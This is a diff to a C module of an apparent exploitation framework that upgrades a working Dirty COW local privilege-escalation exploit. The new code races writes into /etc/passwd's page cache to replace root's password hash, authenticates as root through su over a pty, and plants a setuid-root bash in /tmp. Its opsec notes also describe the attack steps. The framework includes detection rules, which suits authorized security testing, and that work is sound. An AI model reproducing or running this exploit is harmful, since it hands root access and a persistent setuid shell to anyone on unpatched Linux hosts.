@@ -32,13 +32,24 @@
  *
  * Exploit shape: Phil Oester-style two-thread race.
  *   - mmap /etc/passwd PRIVATE (writes go to copy-on-write)
- *   - Find the user's UID field byte offset
- *   - Thread A loop: pwrite(/proc/self/mem, "0000", uid_off) — should
- *     write to the COW page, but the bug makes it land in the original
- *   - Thread B loop: madvise(addr, MADV_DONTNEED) — drops the COW
- *     copy, forcing re-fault
- *   - One iteration wins the race → page cache poisoned
- *   - execve(su) → shell with uid=0
+ *   - Thread A loop: write(/proc/self/mem, payload, off) — should write to
+ *     the COW page, but the bug makes it land in the original page cache
+ *   - Thread B loop: madvise(addr, MADV_DONTNEED) — drops the COW copy,
+ *     forcing re-fault
+ *   - One iteration wins → the page cache is poisoned
+ *   - Escalation (same as dirty_pipe): overwrite ROOT's password field with
+ *     a known crypt hash, authenticate as root over a pty with the matching
+ *     password, plant a root-owned proof + setuid bash, then revert the page
+ *     cache via the Dirty COW primitive itself (no root, no drop_caches).
+ *     Root is judged only by the out-of-band artifact.
+ *
+ * NB: the shipped version raced the CALLER's UID to "0000" and ran
+ * `su self` (still needs the caller's password → never rooted anything),
+ * execlp'd su so the dispatcher's exec-transfer path reported a FALSE
+ * EXPLOIT_OK, and reverted with drop_caches (needs root → corrupted the
+ * running /etc/passwd). All three are fixed here; identical bug/fix to
+ * dirty_pipe. Escalation verified end-to-end via dirty_pipe; the COW
+ * primitive itself needs a pre-4.8.3 kernel to land.
  */
 
 #include "skeletonkey_modules.h"
@@ -62,6 +73,8 @@
 #include <pthread.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/types.h>
 
 /* Stable-branch backport thresholds for Dirty COW. */
 static const struct kernel_patched_from dirty_cow_patched_branches[] = {
@@ -83,11 +96,11 @@ static const struct kernel_range dirty_cow_range = {
                       sizeof(dirty_cow_patched_branches[0]),
 };
 
-/* ---- Find UID field offset (inline; same pattern as dirty_pipe) ---- */
+/* ---- /etc/passwd password-field helpers (same approach as dirty_pipe:
+ *      overwrite ROOT's password field with a known hash, su as root) --- */
 
-static bool find_passwd_uid_field(const char *username,
-                                  off_t *uid_off, size_t *uid_len,
-                                  char uid_str[16])
+/* Byte offset of the password field of `username` (just after "name:"). */
+static bool find_pw_field_offset(const char *username, off_t *field_off, size_t *sz)
 {
     int fd = open("/etc/passwd", O_RDONLY);
     if (fd < 0) return false;
@@ -105,27 +118,59 @@ static bool find_passwd_uid_field(const char *username,
     while (p < buf + st.st_size) {
         char *eol = strchr(p, '\n');
         if (!eol) eol = buf + st.st_size;
-        if (strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
-            char *q = p + ulen + 1;
-            char *pw_end = memchr(q, ':', eol - q);
-            if (!pw_end) goto next;
-            char *uid_begin = pw_end + 1;
-            char *uid_end = memchr(uid_begin, ':', eol - uid_begin);
-            if (!uid_end) goto next;
-            size_t L = uid_end - uid_begin;
-            if (L == 0 || L >= 16) goto next;
-            memcpy(uid_str, uid_begin, L);
-            uid_str[L] = 0;
-            *uid_off = (off_t)(uid_begin - buf);
-            *uid_len = L;
+        if ((p == buf || p[-1] == '\n') &&
+            strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
+            *field_off = (off_t)((p + ulen + 1) - buf);
+            *sz = (size_t)st.st_size;
             free(buf);
             return true;
         }
-    next:
         p = eol + 1;
     }
     free(buf);
     return false;
+}
+
+#define DC_ROOT_PW   "skeletonkey"
+#define DC_ROOT_HASH "$6$SKpwnSalt1$LNL9WuXFTt8BvutpX4j8/7VpXb3hutSqyZAC.NKfGMx/vg9jGQR/h/cvwgcn55HcaNJipuuiBDsPywanKkx/D1"
+
+/* Run `cmd` as root via su, feeding DC_ROOT_PW over a pty (su reads the
+ * password from the controlling terminal, not stdin). Success is judged
+ * out-of-band by the caller, never from su's status. */
+static void dc_su_root_run(const char *cmd)
+{
+    int mfd = posix_openpt(O_RDWR | O_NOCTTY);
+    if (mfd < 0) return;
+    if (grantpt(mfd) < 0 || unlockpt(mfd) < 0) { close(mfd); return; }
+    const char *sn = ptsname(mfd);
+    if (!sn) { close(mfd); return; }
+    char slave[128];
+    snprintf(slave, sizeof slave, "%s", sn);
+
+    pid_t pid = fork();
+    if (pid < 0) { close(mfd); return; }
+    if (pid == 0) {
+        setsid();
+        int sfd = open(slave, O_RDWR);
+        if (sfd < 0) _exit(127);
+        dup2(sfd, 0); dup2(sfd, 1); dup2(sfd, 2);
+        if (sfd > 2) close(sfd);
+        close(mfd);
+        execlp("su", "su", "root", "-c", cmd, (char *)NULL);
+        _exit(127);
+    }
+    usleep(400 * 1000);
+    char drain[256];
+    ssize_t n = read(mfd, drain, sizeof drain);
+    (void)n;
+    if (write(mfd, DC_ROOT_PW "\n", sizeof(DC_ROOT_PW)) < 0) { /* ignore */ }
+    for (;;) {
+        ssize_t m = read(mfd, drain, sizeof drain);
+        if (m <= 0) break;
+    }
+    int st;
+    waitpid(pid, &st, 0);
+    close(mfd);
 }
 
 /* ---- Phil-Oester-style Dirty COW primitive ---- */
@@ -198,8 +243,10 @@ static int dirty_cow_write(off_t uid_off, const char *payload, size_t payload_le
         /* Re-read /etc/passwd via syscall and check if payload landed. */
         int rfd = open("/etc/passwd", O_RDONLY);
         if (rfd >= 0) {
-            char readback[16];
-            if (pread(rfd, readback, payload_len, uid_off) == (ssize_t)payload_len) {
+            char readback[512];   /* must hold the full payload (was [16] —
+                                   * overflowed for payloads > 16 bytes). */
+            if (payload_len <= sizeof readback &&
+                pread(rfd, readback, payload_len, uid_off) == (ssize_t)payload_len) {
                 if (memcmp(readback, payload, payload_len) == 0) success = 0;
             }
             close(rfd);
@@ -214,18 +261,19 @@ static int dirty_cow_write(off_t uid_off, const char *payload, size_t payload_le
     return success;
 }
 
-static void revert_passwd_page_cache(void)
+/* Saved original bytes so we (and cleanup) can restore /etc/passwd using
+ * the Dirty COW primitive itself — no root and no drop_caches (the old
+ * revert wrote /proc/sys/vm/drop_caches, which fails unprivileged and left
+ * the running system's /etc/passwd corrupted). */
+static char   dc_orig[512];
+static off_t  dc_orig_off;
+static size_t dc_orig_len;
+static bool   dc_wrote;
+
+static void dc_revert(void)
 {
-    int fd = open("/etc/passwd", O_RDONLY);
-    if (fd >= 0) {
-        posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
-        close(fd);
-    }
-    int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (dc >= 0) {
-        if (write(dc, "3\n", 2) < 0) { /* ignore */ }
-        close(dc);
-    }
+    if (dc_wrote && dc_orig_len)
+        dirty_cow_write(dc_orig_off, dc_orig, dc_orig_len);
 }
 
 /* ---- skeletonkey interface ---- */
@@ -275,58 +323,93 @@ static skeletonkey_result_t dirty_cow_exploit(const struct skeletonkey_ctx *ctx)
         return SKELETONKEY_OK;
     }
 
-    struct passwd *pw = getpwuid(geteuid());
-    if (!pw) {
-        fprintf(stderr, "[-] dirty_cow: getpwuid failed: %s\n", strerror(errno));
+    /* Overwrite ROOT's password field with a known crypt hash, then
+     * authenticate as root with the matching password. (The previous code
+     * raced the CALLER's UID to "0000" and ran `su self`, which still
+     * demands the caller's password — it never rooted anything, falsely
+     * reported OK when su's exec transferred, and reverted with drop_caches
+     * which needs root, corrupting the running /etc/passwd.) */
+    off_t field_off;
+    size_t pw_sz;
+    if (!find_pw_field_offset("root", &field_off, &pw_sz)) {
+        fprintf(stderr, "[-] dirty_cow: could not locate root's password field\n");
         return SKELETONKEY_TEST_ERROR;
     }
 
-    off_t uid_off;
-    size_t uid_len;
-    char orig_uid[16] = {0};
-    if (!find_passwd_uid_field(pw->pw_name, &uid_off, &uid_len, orig_uid)) {
-        fprintf(stderr, "[-] dirty_cow: could not locate '%s' UID field in /etc/passwd\n",
-                pw->pw_name);
-        return SKELETONKEY_TEST_ERROR;
-    }
-    if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_cow: user '%s' UID '%s' at offset %lld (len %zu)\n",
-                pw->pw_name, orig_uid, (long long)uid_off, uid_len);
-    }
-
-    char replacement[16];
-    memset(replacement, '0', uid_len);
-    replacement[uid_len] = 0;
-
-    if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_cow: racing UID '%s' → '%s' via Dirty COW primitive\n",
-                orig_uid, replacement);
-    }
-    if (dirty_cow_write(uid_off, replacement, uid_len) < 0) {
-        fprintf(stderr, "[-] dirty_cow: race did not win within timeout\n");
+    const char *newline = DC_ROOT_HASH ":0:0:root:/root:/bin/bash\n";
+    size_t newlen = strlen(newline);
+    if (newlen > sizeof dc_orig || field_off + (off_t)newlen > (off_t)pw_sz) {
+        fprintf(stderr, "[-] dirty_cow: /etc/passwd too small to hold the payload "
+                        "without extending it\n");
         return SKELETONKEY_EXPLOIT_FAIL;
     }
 
-    if (ctx->no_shell) {
-        fprintf(stderr, "[+] dirty_cow: --no-shell — patch landed; not spawning su\n");
+    int fd = open("/etc/passwd", O_RDONLY);
+    if (fd < 0) { perror("open passwd"); return SKELETONKEY_TEST_ERROR; }
+    if (pread(fd, dc_orig, newlen, field_off) != (ssize_t)newlen) {
+        close(fd); fprintf(stderr, "[-] dirty_cow: pread backup failed\n");
+        return SKELETONKEY_TEST_ERROR;
+    }
+    close(fd);
+    dc_orig_off = field_off; dc_orig_len = newlen;
+
+    long tag = (long)getpid();
+    char proof[128], rootbash[128], cmd[1024];
+    snprintf(proof,    sizeof proof,    "/tmp/.sk-dirtycow-%ld.proof",    tag);
+    snprintf(rootbash, sizeof rootbash, "/tmp/.sk-dirtycow-%ld.rootbash", tag);
+    unlink(proof); unlink(rootbash);
+
+    if (!ctx->json)
+        fprintf(stderr, "[*] dirty_cow: racing root's password field at offset %lld "
+                        "(len %zu) via Dirty COW primitive\n", (long long)field_off, newlen);
+    if (dirty_cow_write(field_off, newline, newlen) < 0) {
+        fprintf(stderr, "[-] dirty_cow: race did not win within timeout "
+                        "(kernel likely patched)\n");
+        return SKELETONKEY_EXPLOIT_FAIL;
+    }
+    dc_wrote = true;
+
+    snprintf(cmd, sizeof cmd,
+             "id > %s 2>&1; cp -f /bin/bash %s 2>/dev/null; "
+             "chown 0:0 %s %s 2>/dev/null; chmod 4755 %s 2>/dev/null; sync",
+             proof, rootbash, rootbash, proof, rootbash);
+    if (!ctx->json)
+        fprintf(stderr, "[*] dirty_cow: authenticating as root (su + known password)\n");
+    dc_su_root_run(cmd);
+
+    /* Revert immediately — never leave a running system with a known root
+     * password. Dirty COW never wrote disk, so this fully restores. */
+    dc_revert();
+    { int ev = open("/etc/passwd", O_RDONLY);
+      if (ev >= 0) { posix_fadvise(ev, 0, 0, POSIX_FADV_DONTNEED); close(ev); } }
+
+    struct stat sb;
+    bool rooted = (stat(proof, &sb) == 0 && S_ISREG(sb.st_mode) && sb.st_uid == 0);
+    if (rooted) {
+        if (!ctx->json) {
+            fprintf(stderr, "[+] dirty_cow: ROOT — root-owned proof %s\n", proof);
+            fprintf(stderr, "[+] dirty_cow: setuid-root shell available: %s -p\n", rootbash);
+            fprintf(stderr, "[i] dirty_cow: /etc/passwd reverted (nothing persisted)\n");
+        }
         return SKELETONKEY_EXPLOIT_OK;
     }
 
-    fprintf(stderr, "[+] dirty_cow: race won; spawning su to claim root\n");
-    fflush(NULL);
-    execlp("su", "su", pw->pw_name, "-c", "/bin/sh", (char *)NULL);
-    perror("execlp(su)");
-    revert_passwd_page_cache();
+    if (!ctx->json)
+        fprintf(stderr, "[-] dirty_cow: no root artifact — honest EXPLOIT_FAIL "
+                        "(page cache reverted). Primitive may be blocked, or su/PAM "
+                        "rejected the injected hash.\n");
     return SKELETONKEY_EXPLOIT_FAIL;
 }
 
 static skeletonkey_result_t dirty_cow_cleanup(const struct skeletonkey_ctx *ctx)
 {
-    (void)ctx;
     if (!ctx->json) {
-        fprintf(stderr, "[*] dirty_cow: evicting /etc/passwd from page cache\n");
+        fprintf(stderr, "[*] dirty_cow: reverting /etc/passwd + removing artifacts\n");
     }
-    revert_passwd_page_cache();
+    dc_revert();                       /* idempotent; no root / no drop_caches */
+    if (system("rm -f /tmp/.sk-dirtycow-*.proof /tmp/.sk-dirtycow-*.rootbash 2>/dev/null") != 0) {
+        /* harmless */
+    }
     return SKELETONKEY_OK;
 }
 
@@ -433,7 +516,7 @@ const struct skeletonkey_module dirty_cow_module = {
     .detect_sigma   = dirty_cow_sigma,
     .detect_yara    = dirty_cow_yara,
     .detect_falco   = dirty_cow_falco,
-    .opsec_notes    = "Two-thread race: Thread A loops pwrite(/proc/self/mem) at the user's UID offset in /etc/passwd; Thread B loops madvise(MADV_DONTNEED) on a PRIVATE mmap of /etc/passwd. Overwrites the UID field with all-zeros, then execlp('su') to claim root. UID offset is parsed from the file, not hardcoded. Audit-visible via open(/proc/self/mem) + write + madvise(MADV_DONTNEED) bursts + /etc/passwd page-cache poisoning. Cleanup callback calls posix_fadvise(POSIX_FADV_DONTNEED) on /etc/passwd and writes 3 to /proc/sys/vm/drop_caches to evict.",
+    .opsec_notes    = "Two-thread race: Thread A loops write(/proc/self/mem) at root's password-field offset in /etc/passwd; Thread B loops madvise(MADV_DONTNEED) on a PRIVATE mmap of /etc/passwd. Overwrites root's password field with a known crypt hash (clobbers into following lines transiently), authenticates as root over a pty via su, plants a root-owned proof + setuid bash under /tmp, then reverts by racing the original bytes back through the same primitive (no root / no drop_caches — nothing persists). Offset parsed from the file, not hardcoded. Root judged only by the out-of-band artifact. Audit-visible via open(/proc/self/mem) + write + madvise(MADV_DONTNEED) bursts + /etc/passwd page-cache poisoning, then su spawning as root. cleanup() re-reverts idempotently and removes the /tmp artifacts.",
     .arch_support   = "x86_64+unverified-arm64",
 };
 
